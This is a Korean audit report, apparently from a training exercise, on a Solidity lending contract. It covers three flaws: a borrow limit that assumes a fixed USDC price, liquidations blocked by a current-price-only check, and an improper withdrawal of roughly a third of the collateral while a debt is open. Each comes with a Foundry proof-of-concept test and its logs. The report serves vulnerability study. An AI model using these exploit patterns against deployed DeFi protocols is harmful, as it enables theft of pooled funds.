# 김영운

## Borrow

**********************************Informational (파급력: high, 공격 난이도: 일어날일이 사실상 없음)**********************************

```solidity
function _getMaxBorrowCurrentDebtCheck(address user) internal view returns (uint256) {
        **uint256 ethCollateral = userBalances[user].collateral;
        uint256 collateralValueInUsdc = (ethCollateral.mul(priceOracle.getPrice(address(0)))).div(1e18);
        uint256 maxBorrowAmount = (collateralValueInUsdc.mul(LTV)).div(100);**
        uint256 currentDebt = userBalances[user].debt;

        return maxBorrowAmount > currentDebt ? maxBorrowAmount - currentDebt : 0;
    }
```

대출 가능한 수량을 결정할때 USDC의 가격이 일정하다고 생각했기 때문에 가능한 수식인데, 그럴일은 없지만 만약 ETH의 가치가 USDC의 가치보다 내려갈 경우 많은양의 USDC를 빌릴 수 있게 된다.

### PoC

```solidity
function testUSDCisExpensiveThanETH() external {
        lending.deposit(address(usdc), 10000 ether);
        (bool success,) = address(lending).call{value: 1000 ether}(
            abi.encodeWithSelector(DreamAcademyLending.deposit.selector, address(0x0), 1000 ether)
        );
        dreamOracle.setPrice(address(0x0), 1 ether);
        dreamOracle.setPrice(address(usdc), 2000 ether);
        vm.deal(address(user1), 2000 ether);

        vm.startPrank(user1);
        (success,) = address(lending).call{value: 2000 ether}(
            abi.encodeWithSelector(DreamAcademyLending.deposit.selector, address(0x0), 2000 ether)
        );
        lending.borrow(address(usdc), 500 ether);
        uint amountUSDC = usdc.balanceOf(user1);
        console.log("amountUSDC: %d", amountUSDC);
        assertTrue(amountUSDC == 500 ether);
        vm.stopPrank();
    }
```

```solidity
[PASS] testUSDCisExpensiveThanETH() (gas: 305727)
Logs:
  maxBorrow: 1000000000000000000000
  maxBorrowAddress: 1000000000000000000000
  amountUSDC: 500000000000000000000
```

테스트 환경에서는 USDC가 ETH보다 2000배 높은 가치를 가지고 있을 때 user1이 2000 ether의 ETH로 500 USDC를 빌릴수 있음을 증명했다.

## Liquidate 불가능 취약점

**********************************critical (파급력: high, 공격 난이도: medium)**********************************

```solidity
function liquidate(address user, address tokenAddress, uint256 amount) external nonReentrant{
        require(amount > 0, "Liquidation amount must be greater than 0");
        require(msg.sender != user, "Cannot liquidate yourself");
        require(tokenAddress == address(usdc), "Only USDC can be used to liquidate");
        console.log("isHealthy");
        // expect false
        console.logBool(_isHealthy(user));
        require(!_isHealthy(user), "Cannot liquidate a healthy user1");

        (uint256 _oETH, uint256 _oUSDC) = _getCurrentPrices();
        console.log("Impossible");
        // expect false
        console.logBool((_oETH * userBalances[user].collateral * LIQUIDATION_THRESHOLD).div(100) < userBalances[user].debt.mul(_oUSDC));
        console.log("%d, %d",(_oETH * userBalances[user].collateral * LIQUIDATION_THRESHOLD).div(100), userBalances[user].debt.mul(_oUSDC));
        
        require((userBalances[user].debt * 25).div(100) >= amount, "Cannot liquidate a healthy user3");

        uint256 ethAmountToTransfer = amount * userBalances[user].collateral.div(userBalances[user].debt);
        userBalances[user].debt -= amount;
        ERC20(usdc).transferFrom(msg.sender, address(this), amount);
        payable(msg.sender).transfer(ethAmountToTransfer);
        emit Liquidate(user, tokenAddress, amount);
    }
```

예를 들어서 ETH의 가치가 4000 ether이고 USDC의 가치가 1 ether일때 1ether를 담보로 2000 ether를 빌렸다고 치면 ETH의 가치가 3000 ether가 된다면 담보의 가치인 3000 * 1 이 원래의 가치인 4000 * 1의 0.75배가 되기 때문에 청산 가능한 포지션이어야 한다.

하지만 bold처리 해놓은곳을 보면 과거의 가격이 없기 때문에 담보의 가치는 항상 ETH, USDC의 가치 비교로만 알아내야 한다.

3000 *1 *0.75 < 2000 * 1이 참이 되어야 하는데, 담보의 가치인 ETH가 0.75배가 되었음에도 3000 * 0.75 = 2250이기 때문에 청산시킬 수 없다.

### PoC

```solidity
function testLiquidateImpossible() external {
        lending.deposit(address(usdc), 10000 ether);
        dreamOracle.setPrice(address(0x0), 4000 ether);
        dreamOracle.setPrice(address(usdc), 1 ether);
        (bool success,) = address(lending).call{value: 1 ether}(
            abi.encodeWithSelector(DreamAcademyLending.deposit.selector, address(0x0), 1 ether)
        );

        lending.borrow(address(usdc), 2000 ether);
        address x = address(this);

        // 3000/4000 = 0.75
        dreamOracle.setPrice(address(0x0), 3000 ether);
        usdc.transfer(user1, 1000 ether);
        vm.startPrank(user1);
        usdc.approve(address(lending), type(uint256).max);
        (success,) = address(lending).call(
            abi.encodeWithSelector(DreamAcademyLending.liquidate.selector, x, address(usdc), 500 ether)
        );
        assertTrue(success);
        vm.stopPrank();
    }
```

```solidity
[FAIL. Reason: Assertion failed.] testLiquidateImpossible() (gas: 322172)
Logs:
  maxBorrow: 2000000000000000000000
  maxBorrowAddress: 2000000000000000000000
  isHealthy
  false
  Impossible
  false
  2250000000000000000000000000000000000000, 2000000000000000000000000000000000000000
  Error: Assertion Failed
```

![Untitled](%E1%84%80%E1%85%B5%E1%86%B7%E1%84%8B%E1%85%A7%E1%86%BC%E1%84%8B%E1%85%AE%E1%86%AB%20c2b3bd0b179e4c438d76beb10562ab48/Untitled.png)

## 담보 Withdraw 취약점

************************************************************************critical (파급력: high, 공격 난이도: medium)************************************************************************

```solidity
function withdraw(address tokenAddress, uint256 amount) external nonReentrant{
        // @Gamj4tang withdraw normal check
        require(amount > 0, "Withdraw amount must be greater than 0");
        require(userBalances[msg.sender].balance != 0 || userBalances[msg.sender].collateral != 0, "User has no balance to withdraw");
        _calculateInterest(msg.sender);
        if (tokenAddress == address(0)) {
            **if (userBalances[msg.sender].debt == 0) {
                payable(msg.sender).transfer(amount);
                userBalances[msg.sender].collateral -= amount;**
            } else {
                (uint256 _oETH, uint256 _oUSDC) = _getCurrentPrices();
                // @Gamj4tang withdraw threshold check
                console.log("amount: %d", amount);
                **require(((_oETH.mul(userBalances[msg.sender].collateral.sub(amount))) * LIQUIDATION_THRESHOLD).div(100) > userBalances[msg.sender].debt.mul(_oUSDC), "!!!!!!!!!!!!");
                console.log("amount: %d", amount);
                payable(msg.sender).transfer(amount);
                userBalances[msg.sender].collateral -= amount;**
            }

        } else {
            amount = getAccruedSupplyAmount(tokenAddress) / WAD * WAD;
            userBalances[msg.sender].balance += amount - userBalances[msg.sender].balance;
            ERC20(usdc).transfer(msg.sender, amount);
            userBalances[msg.sender].balance -= amount;
        }
        emit Withdraw(msg.sender, tokenAddress, amount);
    }
```

우선 ETH를 withdraw하는 경우에는 두가지 경우가 있는데 대출이 없을 경우 collateral을 확인하지 않고 바로 transfer를 보낸다. 하지만 nonReentrant 모디파이어가 있기 때문에 re-entranacy공격은 불가능하고, deposit한것보다 더 많이 withdraw하려고 하면 **userBalances[msg.sender].collateral -= amount; 에서 arithmetic underflow가 발생한다.**

dept가 있을 경우에는 require구문으로  담보의 가치를 확인하는데, 이전에도 그랬듯이 현재의 가격만을 고려하기 때문에 require문도 우회가 가능하다.

![Untitled](%E1%84%80%E1%85%B5%E1%86%B7%E1%84%8B%E1%85%A7%E1%86%BC%E1%84%8B%E1%85%AE%E1%86%AB%20c2b3bd0b179e4c438d76beb10562ab48/Untitled%201.png)

빚이 있는 상황에서 withdraw를 할 시 require구문을 풀어보면 위와 같이 나온다.

결론적으로 담보의 거의 1/3만큼은 그냥 빼내올 수 있다.

### PoC

```solidity
function testWithdraw() external {
        dreamOracle.setPrice(address(0x0), 4000 ether);
        dreamOracle.setPrice(address(usdc), 1 ether);
        (bool success,) = address(lending).call{value: 10000 ether}(
            abi.encodeWithSelector(DreamAcademyLending.deposit.selector, address(0x0), 10000 ether)
        );
        lending.deposit(address(usdc), 1000000 ether);

        vm.deal(user1, 100000000 ether);
        vm.startPrank(user1);
        console.log("Before Deposit ETH: %d", user1.balance);
        (success,) = address(lending).call{value: 20 ether}(
            abi.encodeWithSelector(DreamAcademyLending.deposit.selector, address(0x0), 20 ether)
        );
        
        lending.borrow(address(usdc), 40000 ether);
        console.log("Before Withdraw After Borrow ETH: %d", user1.balance);
        console.log("Before Withdraw After Borrow USDC: %d", usdc.balanceOf(user1));
        
        uint amount = uint(20 * 10 ** 18) / 3 - 1;
        lending.withdraw(address(0x0), amount);
        console.log("After Withdraw ETH: %d", user1.balance);
        console.log("After Withdraw USDC: %d", usdc.balanceOf(user1));
        vm.stopPrank();
    }
```

```solidity
[PASS] testWithdraw() (gas: 326655)
Logs:
  Before Deposit ETH: 100000000000000000000000000
  maxBorrow: 40000000000000000000000
  maxBorrowAddress: 40000000000000000000000
  Before Withdraw After Borrow ETH: 99999980000000000000000000
  Before Withdraw After Borrow USDC: 40000000000000000000000
  After Withdraw ETH: 99999986666666666666666665
  After Withdraw USDC: 40000000000000000000000
```

![Untitled](%E1%84%80%E1%85%B5%E1%86%B7%E1%84%8B%E1%85%A7%E1%86%BC%E1%84%8B%E1%85%AE%E1%86%AB%20c2b3bd0b179e4c438d76beb10562ab48/Untitled%202.png)
